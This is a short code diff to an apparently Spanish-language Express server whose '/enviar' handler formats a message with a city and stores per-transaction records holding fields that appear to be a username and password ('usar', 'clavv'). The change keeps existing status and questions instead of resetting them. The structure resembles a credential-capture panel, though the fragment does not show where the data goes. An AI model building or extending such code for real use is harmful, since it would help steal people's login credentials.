@@ -55,12 +55,11 @@ app.post('/enviar', async (req, res) => {
 🏙️ Ciudad: ${ciudad}
 `;
 
+  // Mantener estado y preguntas si ya existen
   clientes[txid] = {
-    status: "esperando",
+    ...clientes[txid],
     usar,
-    clavv,
-    preguntas: [],
-    esperando: null
+    clavv
   };
   guardarEstado();
 
